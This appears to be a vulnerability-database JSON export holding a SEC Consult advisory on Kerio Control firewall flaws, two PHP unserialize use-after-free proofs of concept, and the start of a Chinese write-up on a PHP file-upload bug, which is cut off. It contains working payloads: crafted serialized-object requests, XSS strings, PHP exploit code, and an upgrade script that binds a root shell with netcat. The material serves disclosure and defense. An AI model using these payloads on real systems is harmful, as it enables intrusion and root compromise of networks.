\nwith Kerio Control, the easy-to-administer yet powerful all-in-one  \nsecurity solution.  \nKerio Control brings together next-generation firewall capabilities -  \nincluding a network firewall and router, intrusion detection and  \nprevention (IPS), gateway anti-virus, VPN, and web contentand  \napplication filtering. These comprehensive capabilities and unmatched  \ndeployment flexibility make Kerio Control the ideal choice for small  \nand mid-sized businesses.\"  \n  \nSource: http://www.kerio.com/products/kerio-control  \n  \n  \nBusiness recommendation:  \n------------------------  \nBy combining the vulnerabilities documented in this advisory an attacker  \ncan fully compromise a network which uses the Kerio Control appliance for  \nprotection.  \n  \nThe attacker can trick a victim to visit a malicious website which then conducts  \nthe internal attack. The attacked victim must be logged in or weak credentials  \nmust be configured which can be found with a bruteforce attack.  \n  \nThe attacker will gain a reverse root shell from the Internet to the internal  \nKerio Control firewall system. Moreover, it's possible that an internal attacker  \nuses the described vulnerabilities to escalate his privileges (low privileged  \naccount to full root shell) to steal credentials from other users on the UTM  \nappliance.  \n  \nMost vulnerabilities (RCE, CSRF bypasses, XSS, Heap Spraying) were found  \nin just two PHP scripts. Both scripts are not referenced by any other  \nPHP script nor by any binary on the system.  \nBoth scripts contain a different(!), seemingly deliberate(?) CSRF bypass  \nwhich make the vulnerabilities exploitable from the Internet to obtain a  \nreverse root shell.  \n  \nSEC Consult recommends not to use Kerio Control until a thorough security  \nreview has been performed by security professionals and all identified  \nissues have been resolved.  \n  \n  \nVulnerability overview/description:  \n-----------------------------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nAn authenticated user (standard user or administrator) can control data, which  \ngets later unserialized. Kerio Control uses PHP 5.2.13 which was released on  \n2010-02-25. This version is more than 6 years old and several bugs were found  \nin the meantime within the unserialize function. The following CVE numbers  \nare just some examples for vulnerabilities in unserialize which lead to remote  \ncode execution:  \n-) CVE-2014-8142  \n-) CVE-2014-3515  \n-) CVE-2015-0231  \n-) CVE-2015-6834  \n-) CVE-2016-5771  \n-) CVE-2016-5773  \n  \nPHP 5.2.13 is especially affected by CVE-2014-3515. This vulnerability uses a  \ntype confusion attack to trigger a use-after-free vulnerability. It can be used  \nto read data and get full code execution. In the case of Kerio Control the  \nresult of unserialize is not reflected back to the attacker. It's therefore not  \npossible to read memory from the stack or heap (e.g. to bypass ASLR).  \n  \nNevertheless, SEC Consult developed a fully working and reliable (blind) exploit  \nfor this vulnerability which spawns a reverse root shell to the Kerio Control  \nsystem.  \nFor this exploit a user account is required. However, it's also possible to  \nconduct the attack via the Internet because the CSRF (Cross Site Request  \nForgery) check can be bypassed (see below).  \n  \nAn attacker can use this vulnerability to break into a company network via the  \nInternet by tricking a logged in user to visit a malicious website. Even if the  \nuser is currently not logged in the attacker can start a bruteforce attack to  \nobtain valid credentials to conduct the attack.  \n  \n  \n2) PHP script allows heap spraying  \nOne of the PHP scripts allows the allocation of memory inside the main binary  \n(winroute) of Kerio Control. Winroute contains the code of most services  \n(e.g. the webserver, PHP, network related functionality, ...).  \nThe memory will not be freed after finishing the request and can therefore be  \nused to spray payloads to the whole memory space.  \n  \nThis vulnerability was used in the overall exploit to defeat ASLR.  \nPlease bear in mind that it's very likely that an attacker can write a working  \nexploit without heap spraying. Fixing this vulnerability would therefore not  \nprevent the exploitation of the remote code execution vulnerability.  \nFor example, the information disclosure vulnerability from this advisory can  \nbe used to bypass ASLR as well. This would eliminate the need of heap spraying.  \n  \n  \n3) CSRF Protection Bypass  \nThe PHP scripts contain code to protect against CSRF (Cross Site Request  \nForgery) attacks. Because of the wrong usage of PHP binary  \noperations and comparisons it's possible to bypass this check. That means  \nthat an attacker can trigger requests from other websites which will be handled  \nby Kerio Control. This vulnerability allows to exploit the remote code  \nexecution vulnerability from the Internet to break into a network.  \n  \n  \n4) Webserver running with root privileges  \nThe main binary (which contains the webserver and PHP) runs with root  \nprivileges.  \n  \nKerio told SEC Consult that this vulnerability will not be fixed. SEC  \nConsult strongly recommended otherwise.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nKerio Control does not properly encode parameters which are reflected on the  \nwebsite. This leads to cross site scripting vulnerabilities.  \nAn attacker can abuse these vulnerabilities to modify the website or do actions  \nin the context of the attacked user.  \n  \n  \n6) Missing memory corruption protections  \nThe main binary (winroute) is not compiled as position-independent executable  \n(PIE). This allowed the use of ROP (return-oriented-programming) code to  \nbypass the not executable heap. Moreover, the stack is per default marked as  \nexecutable, but the exact location of the stack is randomized by ASLR.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nOne of the PHP scripts leaks pointers to the stack and heap.  \nThis can be abused by attackers to bypass ASLR.  \nBecause stacks are marked as executable an attacker can therefore easily bypass  \nASLR and DEP/NX.  \n  \n  \n8) Remote Code Execution as administrator  \nNearly a year ago on 2015-10-12 Raschin Tavakoli reported a remote code  \nexecution vulnerability in the administrative web interface in the upgrade  \nfunctionality. This vulnerability is still unfixed, only the associated XSS  \nvulnerability was fixed. However, an attacker can still exploit it from the  \nInternet, e.g. by abusing the XSS vulnerability described in this advisory  \n(where the CSRF check can be bypassed).  \n  \nWith this vulnerability an attacker can gain a reverse root shell on  \nKerio Control again if a logged in administrator visits a malicious website  \non the Internet.  \nMore information can also be found in the old advisory:  \nhttps://www.exploit-db.com/exploits/38450/  \n  \n  \n9) Login not protected against brute-force attacks  \nThere are no bruteforce protections in place for the login.  \nIf an unauthenticated victim visits an attacker's website, the attacker can  \nstart a bruteforce attack to obtain valid credentials to execute the  \nremote code execution exploit. Via image-loading the attacker can detect if  \nthe current credentials are valid (without violating SOP).  \n  \n  \nProof of concept:  \n-----------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nThe following request can be used to set the unserialize data. In this example  \na faked string is used which points to 0xffffffff (kernel memory). Unserializing  \nit will therefore crash the remote webserver (the winroute process).  \n  \nPOST /set.php HTTP/1.1  \nHost: $IP:4081  \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \nContent-Type: application/x-www-form-urlencoded  \nContent-Length: 730  \n  \nk_securityHash=x&target=k_sessionVariable&k_variable=lastDisplayed&k_value=a:18:{s:8:\"k_dbName\";s:5:\"error\";s:11:\"k_dbSummara\";s:3:\"abc\";s:14:\"k_dbIndividual\";s:3:\"abc\";s:16:\"k_dbLastUsedType\";s:3:\"abc\";s:10:\"k_dbLayout\";s:3:\"abc\";s:10:\"k_pageType\";s:3:\"abc\";s:13:\"k_periodStart\";i:123;s:11:\"k_periodEnd\";i:123;s:8:\"k_userId\";i:123;s:6:\"tabBar\";i:123;s:13:\"k_gotoElement\";i:123;s:9:\"k_protoId\";i:123;s:11:\"k_errorType\";i:123;s:16:\"k_timezoneOffset\";i:123;s:9:\"k_groupId\";i:123;s:2:\"id\";i:123;s:11:\"k_dbSummary\";C:16:\"SplObjectStorage\":152:{x:i:2;O:8:\"stdClass\":1:{i:0;a:2:{i:1;i:1;i:2;i:2;}};d:2.0851592721051977e-262;;m:a:2:{i:0;S:15:\"\\ff\\ff\\ff\\ff\\20\\00\\00\\00\\01\\00\\00\\00\\06\\00\\00\";i:1;R:3;}}s:18:\"k_historyTimestamp\";s:3:\"abc\";}  \n  \nThe following request will call unserialize on the injected data:  \n  \nGET /contentLoader.php?k_getHistoryId=1&k_securityHash=x HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nIn the example above only a denial of service will be conducted. However, an  \nattacker can change the data type to object to get full code execution on  \nthe remote system.  \n  \nSEC Consult developed a fully working exploit for this attack which spawns a  \nroot shell. Please note that this exploit was intentionally written to just  \ntarget Kerio Control 9.1.0 Build 1087. This is because hardcoded offsets  \nare used which belong to the winroute binary with the SHA256 hash:  \n2808c35528b9a4713b91f65a881dfca03088de08b6331fdee1c698523bd757b0  \nThis exploit will not be released for now.  \n  \nA real-world-attacker can detect the remote binary version by bruteforcing  \nthe object handler related to CVE-2014-3515.  \n  \n  \n2) PHP script allows heap spraying  \nThe set.php script contains the following code:  \n$p_variable = urldecode($_POST['k_variable']);  \n$p_value = urldecode($_POST['k_value']);  \n...  \n$p_session->setSessionVariable($p_variable, $p_value);  \n  \nPOST requests with the following parameters can therefore be used to allocate  \nspace on the remote system:  \nk_securityHash=x&target=k_sessionVariable&k_variable=<random_name>  \n&k_value=<payload_to_allocate>  \n  \nDuring tests it was possible to spray approximately 400 MB data in 30 seconds  \nwhich is enough to control two predictable addresses on the heap.  \n  \n  \n3) CSRF Protection Bypass  \nTwo scripts are required for the remote code execution exploit:  \n-) set.php  \n-) ContentLoader.php  \nBoth scripts contain different very interesting CSRF check bypasses.  \n  \nThe following code can be found in set.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'] || $_POST['k_securityHash'];  \nif ('' == $p_postedHash || ($p_postedHash != $p_securityHash)) {  \nexit();  \n}  \n  \nSince the programming language is PHP (and not JavaScript), the above code code  \ndoes not work as expected. $p_postedHash can only become 0 or 1 because || is a  \nlogical operator. The if-condition compares the valid token with the posted one  \nvia the != operator, however, this will not check if types are the same.  \nIf k_securityHash is set (either via GET or POST) to any value, the above code  \nwill compare the number 1 with a string, which will always bypass the check.  \nIt's therefore enough to set k_securityHash to any value to bypass the CSRF  \nprotection.  \n  \nThe following code can be found in contentLoader.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'];  \n...  \nif (!$p_session || ('' == $p_postedHash && $p_postedHash != $p_securityHash)) {  \n$p_page = new p_Page();  \n$p_page->p_jsCode('window.top.location = \"index.php\";');  \n$p_page->p_showPageCode();  \ndie();  \n}  \n  \nNow the programmers only use the GET parameter, however, they changed the  \nlogical operator in the if condition from || to && which means that the CSRF  \ncheck will only be applied if $p_postedHash is empty. It's therefore again  \nenough to set k_securityHash to any value to bypass the check.  \n  \n  \n4) Webserver running with root privileges  \nNo proof of concept necessary.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nIn the following request the k_historyTimestamp parameter is prone to XSS:  \nhttps://<IP>:4081/contentLoader.php?k_dbName=x&k_securityHash=x  \n&k_historyTimestamp=aa%22;alert(1)%3b//  \n  \nIn the same request the id parameter can be used to inject JavaScript code.  \nNote that the attack can only be conducted against administrative users.  \nUsers with standard privileges can only access pages with k_dbName set to one  \nof the following values:  \n-) accStats  \n-) prefs  \n-) dialup  \n-) error  \n  \nIn such a case Kerio Control adds code like the following  \n(in this example k_dbName=dialup):  \nvar k_newDbName = \"<kerio:text id=\"tabCaption_dialup\"/>\";  \n  \nThe \" characters within the string are not correctly encoded.  \nThis will lead to the termination of the JavaScript execution. Because the  \ninjected payload is stored after this code, the attacker must bypass this  \ncode to ensure that the payload gets executed. This is only possible if  \nthe attacked user is an administrator because administrators can load any  \ndbName. By setting k_dbName to an invalid dbName (e.g. to 'x'), code like  \nthe following will be added instead (which does not crash):  \nvar k_newDbName = \"\";  \n  \nAnother XSS can be found at:  \nhttps://<IP>:4081/admin/internal/dologin.php?hash=%0D%0A\"><script>alert(1);</script><!--  \n  \n  \n6) Missing memory corruption protections  \nNo proof of concept necessary.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nThe following request returns information to the currently logged in user  \n(e.g. session token and username):  \n  \nGET /nonauth/getLoginType.js.php HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nThe following is a typical response:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 11:47:34 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginUnlock\";k_loginParams.k_nonauthToken =  \n\"0xb59066a8\";k_loginParams.k_sessionToken =  \n\"bc7c9ae78f01e498b7c935b4ad521b664d4e2c5574bde30cdf57851a58763660\";k_loginParams.k_loggedUser  \n= {k_asocName: \"user\", k_fullName: \"user\"};  \n  \nThe above response contains a valid pointer (0xb59066a8). In most cases this  \npointer will point to the heap. However, sometimes this pointer will point  \ninto a readable and writeable region behind a stack-region.  \nThe target location always stores the same data. During the analysis no  \nfurther effort was spent on analysing this behaviour.  \n  \nThe pointer will also be disclosed if the user is already logged out.  \nIn such a case the response looks like:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 12:04:44 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginCommon\";k_loginParams.k_nonauthToken =  \n\"0xb2ee208\";  \n  \n  \nAn attack scenario can be:  \n-) The attacker tricks a victim to visit the attacker's malicious website  \n-) The attacker's website uses the CSRF bypass and the identified XSS  \nvulnerability to embed a malicious script inside the Kerio Control website  \n-) The attacker's website iframes the Kerio Control website to trigger the  \nexecution of the XSS payload  \n-) The XSS payload runs on the same domain and can therefore send requests  \nand read responses. This means the attacker can send requests to  \ngetLoginType.js.php to obtain a memory pointer.  \n-) If the memory pointer is within a specific range (e.g. the highest nibble  \nis zero), it's a pointer to the heap. In such a case the RCE vulnerability  \ncan be used to crash and restart the server. After that the same check can  \nbe done again.  \n-) If the memory pointer points near a stack (highest nibble is 0xb), the  \npointer can be used to calculate the base address of a stack.  \n-) Now the attacker knows the location of a stack (all stacks are marked as  \nreadable, writeable and executable). He can now easily bypass ASLR and DEP.  \n  \n  \n8) Remote Code Execution as administrator  \nAn attacker can create a malicious upgrade image with the following  \ncommands:  \ncat upgrade.sh  \n#!/bin/bash  \nnc -lp 9999 -e /bin/bash &  \n  \ntar czf upgrade.tar.gz *  \nmv upgrade.tar.gz upgrade.img  \n  \nThe image can be uploaded in the administrative web interface.  \nThis will bind a root shell on port 9999. The complete attack can also be  \nconducted via the cross site scripting vulnerability described in this  \nadvisory (XSS in contentLoader.php). This enables an attacker to conduct  \nthe attack from the Internet to obtain a reverse shell on Kerio Control.  \n  \n  \n9) Login not protected against brute-force attacks  \nValid credentials can be obtained via a brute-force attack.  \nIt's enough to send a POST request to /internal/dologin.php with the  \nparameters kerio_username and kerio_password set. A remote attacker  \ncan detect if the credentials are correct without reading the  \nresponse (SOP would not allow to read the response). This is possible  \nbecause /internal/photo will only return a valid image if the user is  \ncurrently logged in. The attacker can load an image from this URL and  \ncheck if loading was successful to leak the information if the  \ncredentials are valid or not.  \nThe following code demonstrates this:  \n<img src=\"https://<Kerio-IP>/internal/photo\" onerror=not_logged_in();  \nonload=logged_in();></img>  \n  \n  \nVulnerable / tested versions:  \n-----------------------------  \nThe following product versions were found to be vulnerable which were the  \nlatest versions available at the time of the discovery:  \nv9.1.0 (Build 1087)  \nv9.1.1 (Build 1324)  \n  \n  \nVendor contact timeline:  \n------------------------  \n2016-08-29: Contacting vendor through website  \n(bug report: bugreports@support.kerio.com) Ticket-ID: MYW-768664  \n2016-08-31: No answer, contacting CTO of Kerio via email  \n2016-09-01: Received security contact with PGP & S/MIME certificate  \n2016-09-01: Transmission of PGP encrypted advisory to Kerio  \n2016-09-09: Received answer, Kerio confirms vulnerabilities 1,2,3,5,6,7  \nStatement to vulnerability 9:  \n\"the feature already is in the product.\"  \nStatement to vulnerabilities 4 (Webserver running with root  \nprivileges) and 8 (Remote Code Execution as administrator):  \n\"I do not consider this a vulnerability\"  \nUpdate including a fix will be available on 2016-09-20  \n2016-09-09: SEC Consult informed Kerio to re-think the decision  \nnot fixing the vulnerabilities 4, 8 and 9  \nSEC Consult highly recommends to fix all reported issues  \n2016-09-13: SEC Consult informed Kerio that the advisory will be  \nreleased on 2016-09-22  \n2016-09-20: Kerio releases patch for Kerio Control  \n2016-09-22: Coordianted release of security advisory  \n  \n  \nSolution:  \n---------  \nThe vendor has released version 9.1.3 on 20th September which, according  \nto the vendor, fixes the vulnerabilities 1,2,3,5,6,7.  \n  \nThe vendor told us the following regarding vulnerability 9:  \n\"the feature already is in the product\"  \n  \nVulnerability 4 and 8 are not considered a vulnerability by the vendor  \nand will not be fixed.  \nSEC Consult strongly recommended fixing issue 4 and 8 as well.  \n  \nThe latest version can be downloaded from here:  \nhttp://www.kerio.com/support/kerio-control  \nhttp://www.kerio.com/support/kerio-control/release-history  \n  \n  \nWorkaround:  \n-----------  \nNone  \n  \n  \nAdvisory URL:  \n-------------  \nhttps://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm  \n  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nSEC Consult Vulnerability Lab  \n  \nSEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nAbout SEC Consult Vulnerability Lab  \nThe SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It  \nensures the continued knowledge gain of SEC Consult in the field of network  \nand application security to stay ahead of the attacker. The SEC Consult  \nVulnerability Lab supports high-quality penetration testing and the evaluation  \nof new offensive and defensive technologies for our customers. Hence our  \ncustomers obtain the most current information about vulnerabilities and valid  \nrecommendation about the risk profile of new technologies.  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \nInterested to work with the experts of SEC Consult?  \nSend us your application https://www.sec-consult.com/en/Career.htm  \n  \nInterested in improving your cyber security with the experts of SEC Consult?  \nContact our local offices https://www.sec-consult.com/en/About/Contact.htm  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nMail: research at sec-consult dot com  \nWeb: https://www.sec-consult.com  \nBlog: http://blog.sec-consult.com  \nTwitter: https://twitter.com/sec_consult  \n  \nEOF R. Freingruber / @2016  \n  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:138812"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP SplDoublyLinkedList unserialize() Use-After-Free. CVE-2015-6834. Dos exploit for php platform",
            "modified": "2015-09-09T00:00:00",
            "published": "2015-09-09T00:00:00",
            "id": "EDB-ID:38120",
            "href": "https://www.exploit-db.com/exploits/38120/",
            "type": "exploitdb",
            "title": "PHP SplDoublyLinkedList unserialize Use-After-Free",
            "sourceData": "Yet Another Use After Free Vulnerability in unserialize() with SplDoublyLinkedList\r\n\r\nTaoguang Chen <[@chtg](http://github.com/chtg)> - \r\nWrite Date: 2015.8.27 \r\nRelease Date: 2015.9.4\r\n\r\nA use-after-free vulnerability was discovered in unserialize() with SplDoublyLinkedList object's deserialization and crafted object's __wakeup() magic method that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.\r\n\r\nAffected Versions\r\n------------\r\nAffected is PHP 5.6 < 5.6.13\r\nAffected is PHP 5.5 < 5.5.29\r\nAffected is PHP 5.4 < 5.4.45\r\n\r\nCredits\r\n------------\r\nThis vulnerability was disclosed by Taoguang Chen.\r\n\r\nDescription\r\n------------\r\n\r\n\r\n  while(*p == ':') {\r\n    ++p;\r\n    ALLOC_INIT_ZVAL(elem);\r\n    if (!php_var_unserialize(&elem, &p, s + buf_len, &var_hash TSRMLS_CC)) {\r\n      zval_ptr_dtor(&elem);\r\n      goto error;\r\n    }\r\n\r\n    spl_ptr_llist_push(intern->llist, elem TSRMLS_CC);\r\n  }\r\n\r\n\r\nIt has been demonstrated many times before that __wakeup() leads to\r\nZVAL is freed from memory. However during deserialization will still\r\nallow to use R: or r: to set references to that already freed memory.\r\nIt is possible to use-after-free attack and execute arbitrary code\r\nremotely.\r\n\r\nProof of Concept Exploit\r\n------------\r\nThe PoC works on standard MacOSX 10.11 installation of PHP 5.6.12.\r\n\r\n\r\n<?php\r\n\r\nclass obj {\r\n  var $ryat;\r\n  function __wakeup() {\r\n    $this->ryat = 1;\r\n  }\r\n}\r\n\r\n$fakezval = ptr2str(1122334455);\r\n$fakezval .= ptr2str(0);\r\n$fakezval .= \"\\x00\\x00\\x00\\x00\";\r\n$fakezval .= \"\\x01\";\r\n$fakezval .= \"\\x00\";\r\n$fakezval .= \"\\x00\\x00\";\r\n\r\n$inner = 'i:1234;:i:1;';\r\n$exploit = 'a:5:{i:0;i:1;i:1;C:19:\"SplDoublyLinkedList\":'.strlen($inner).':{'.$inner.'}i:2;O:3:\"obj\":1:{s:4:\"ryat\";R:3;}i:3;a:1:{i:0;R:5;}i:4;s:'.strlen($fakezval).':\"'.$fakezval.'\";}';\r\n\r\n$data = unserialize($exploit);\r\n\r\nvar_dump($data);\r\n\r\nfunction ptr2str($ptr)\r\n{\r\n  $out = '';\r\n  for ($i = 0; $i < 8; $i++) {\r\n    $out .= chr($ptr & 0xff);\r\n    $ptr >>= 8;\r\n  }\r\n  return $out;\r\n}\r\n\r\n?>\r\n\r\n\r\nTest the PoC on the command line:\r\n\r\n\r\n$ php uafpoc.php\r\narray(5) {\r\n  [0]=>\r\n  int(1)\r\n  [1]=>\r\n  &int(1)\r\n  [2]=>\r\n  object(obj)#2 (1) {\r\n    [\"ryat\"]=>\r\n    &int(1)\r\n  }\r\n  [3]=>\r\n  array(1) {\r\n    [0]=>\r\n    int(1122334455)  <===  so we can control the memory and create fake ZVAL :)\r\n  }\r\n  [4]=>\r\n  string(24) \"?v?B????\"\r\n}\r\n",
            "cvss": {
                "score": 0.0,
                "vector": "NONE"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:38120"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP SplObjectStorage unserialize() Use-After-Free. CVE-2015-6834. Dos exploit for php platform",
            "modified": "2015-09-09T00:00:00",
            "published": "2015-09-09T00:00:00",
            "id": "EDB-ID:38122",
            "href": "https://www.exploit-db.com/exploits/38122/",
            "type": "exploitdb",
            "title": "PHP SplObjectStorage unserialize Use-After-Free",
            "sourceData": "Yet Another Use After Free Vulnerability in unserialize() with SplObjectStorage\r\n\r\nTaoguang Chen <[@chtg](http://github.com/chtg)> \r\nWrite Date: 2015.8.27 \r\nRelease Date: 2015.9.4\r\n\r\nA use-after-free vulnerability was discovered in unserialize() with SplObjectStorage object's deserialization and crafted object's __wakeup() magic method that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.\r\n\r\nAffected Versions\r\n------------\r\nAffected is PHP 5.6 < 5.6.13\r\nAffected is PHP 5.5 < 5.5.29\r\nAffected is PHP 5.4 < 5.4.45\r\n\r\nCredits\r\n------------\r\nThis vulnerability was disclosed by Taoguang Chen.\r\n\r\nDescription\r\n------------\r\n\r\n\r\n    ALLOC_INIT_ZVAL(pentry);\r\n    if (!php_var_unserialize(&pentry, &p, s + buf_len, &var_hash TSRMLS_CC)) {\r\n      zval_ptr_dtor(&pentry);\r\n      goto outexcept;\r\n    }\r\n    if(Z_TYPE_P(pentry) != IS_OBJECT) {\r\n      goto outexcept;\r\n    }\r\n    ALLOC_INIT_ZVAL(pinf);\r\n    if (*p == ',') { /* new version has inf */\r\n      ++p;\r\n      if (!php_var_unserialize(&pinf, &p, s + buf_len, &var_hash TSRMLS_CC)) {\r\n        zval_ptr_dtor(&pinf);\r\n        goto outexcept;\r\n      }\r\n    }\r\n\r\n\r\nIt has been demonstrated many times before that __wakeup() leads to\r\nZVAL is freed from memory. However during deserialization will still\r\nallow to use R: or r: to set references to that already freed memory.\r\nIt is possible to use-after-free attack and execute arbitrary code\r\nremotely.\r\n\r\nProof of Concept Exploit\r\n------------\r\nThe PoC works on standard MacOSX 10.11 installation of PHP 5.6.12.\r\n\r\n\r\n<?php\r\n\r\nclass obj {\r\n  var $ryat;\r\n  function __wakeup() {\r\n    $this->ryat = 1;\r\n  }\r\n}\r\n\r\n$fakezval = ptr2str(1122334455);\r\n$fakezval .= ptr2str(0);\r\n$fakezval .= \"\\x00\\x00\\x00\\x00\";\r\n$fakezval .= \"\\x01\";\r\n$fakezval .= \"\\x00\";\r\n$fakezval .= \"\\x00\\x00\";\r\n\r\n$inner = 'x:i:1;O:8:\"stdClass\":0:{},i:1;;m:a:0:{}';\r\n$exploit = 'a:5:{i:0;i:1;i:1;C:16:\"SplObjectStorage\":'.strlen($inner).':{'.$inner.'}i:2;O:3:\"obj\":1:{s:4:\"ryat\";R:3;}i:3;R:6;i:4;s:'.strlen($fakezval).':\"'.$fakezval.'\";}';\r\n\r\n$data = unserialize($exploit);\r\n\r\nvar_dump($data);\r\n\r\nfunction ptr2str($ptr)\r\n{\r\n  $out = '';\r\n  for ($i = 0; $i < 8; $i++) {\r\n    $out .= chr($ptr & 0xff);\r\n    $ptr >>= 8;\r\n  }\r\n  return $out;\r\n}\r\n\r\n?>\r\n\r\n\r\nTest the PoC on the command line:\r\n\r\n\r\n$ php uafpoc.php\r\narray(5) {\r\n  [0]=>\r\n  int(1)\r\n  [1]=>\r\n  &int(1)\r\n  [2]=>\r\n  object(obj)#3 (1) {\r\n    [\"ryat\"]=>\r\n    &int(1)\r\n  }\r\n  [3]=>\r\n  int(1122334455)  <===  so we can control the memory and create fake ZVAL :)\r\n  [4]=>\r\n  string(24) \"?v?B????\"\r\n}\r\n",
            "cvss": {
                "score": 0.0,
                "vector": "NONE"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:38122"
        }
    ],
    "CVE-2015-2348": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08CVE-2015-2348\uff09\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cphp\u7684\u5f00\u53d1\u8005\u4f1a\u5bf9\u6587\u4ef6\u540d\u540e\u7f00\u3001\u6587\u4ef6\u7c7b\u578b(Content-Type)\u3001Mime type\u3001\u6587\u4ef6\u5927\u5c0f\u7b49\u8fdb\u884c\u68c0\u67e5\u6765\u9650\u5236\u6076\u610fphp\u811a\u672c\u7684\u4e0a\u4f20\uff0c\u4f46\u662f\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u7ed5\u8fc7\u8fd9\u4e9b\u9650\u5236\uff0c\u76f4\u63a5\u4e0a\u4f20\u6076\u610f\u7684\u6587\u4ef6\u3002\r\n\r\n### \u6f0f\u6d1e\u8be6\u60c5\r\n\r\n\u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8ephp\u7684move_uploaded_file()\u51fd\u6570\u4e2d\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e00\u822c\u5728\u4e0a\u4f20\u6587\u4ef6\u65f6\u88ab\u4f7f\u7528\uff0c\u7528\u9014\u662f\u5c06\u4e0a\u4f20\u7684\u6587\u4ef6\u79fb\u52a8\u5230\u65b0\u4f4d\u7f6e\u3002\r\n\r\n```\r\nmove_uploaded_file ( string $filename , string $destination )\r\n```\r\n\r\n\u8fd9\u6b21\u7684\u6f0f\u6d1e\u5c31\u51fa\u73b0\u5728$destination\u8fd9\u4e2a\u53c2\u6570\u4e2d\uff0c\u8fd9\u4e2a\u53c2\u6570\u4ee3\u8868\u7684\u662f\u4e0a\u4f20\u6587\u4ef6\u79fb\u52a8\u7684\u6700\u7ec8\u76ee\u7684\u5730\u5740\u3002\u5982\u679c$destination\u53d8\u91cf\u662f\u4ece\u7528\u6237$_GET\u6216$_POST\u4e2d\u83b7\u5f97\u7684\u5e76\u4e14\u6211\u4eec\u53ef\u63a7\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u7a7a\u5b57\u7b26\\x00\u6765\u622a\u65ad\u540e\u9762\u7684\u62d3\u5c55\u540d\uff0c\u4ece\u800c\u9020\u6210\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u3002\r\n\r\n### \u6f0f\u6d1e\u5229\u7528\u6f14\u793a\r\n\r\n\u6211\u4eec\u5229\u7528DVWA\u7684high\u96be\u5ea6\u6765\u6f14\u793a\uff0c\u9996\u5148\u6211\u4eec\u628amove_uploaded_file()\u51fd\u6570\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6539\u6210\u6211\u4eec\u53ef\u63a7\u7684$_POST['xxname']\u3002\r\n\r\n```\r\n<?php\r\nif (isset($_POST['Upload'])) {\r\n$target_path = DVWA_WEB_PAGE_TO_ROOT.\"hackable/uploads/\";\r\n$target_path = $target_path . basename($_FILES['uploaded']['name']);\r\n$uploaded_name = $_FILES['uploaded']['name'];\r\n$uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1);\r\n$uploaded_size = $_FILES['uploaded']['size'];\r\nif (($uploaded_ext == \"jpg\" || $uploaded_ext == \"JPG\" || $uploaded_ext == \"jpeg\" || $uploaded_ext == \"JPEG\") && ($uploaded_size < 100000)){\r\nif(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $_POST['xxname'])) {\r\n$html .= '<pre>';\r\n$html .= 'Your image was not uploaded.';\r\n$html .= '</pre>';\r\n      } else {\r\n$html .= '<pre>';\r\n$html .= $target_path . ' succesfully uploaded!';\r\n$html .= '</pre>';\r\n}\r\n}\r\nelse{\r\n$html .= '<pre>';\r\n$html .= 'Your image was not uploaded.';\r\n$html .= '</pre>';\r\n}\r\n}\r\n?>\r\n```\r\n\r\n![](https://images.seebug.org/contribute/e24a34b4-e688-4c49-89c6-ae6b485f06db-2015-09-22 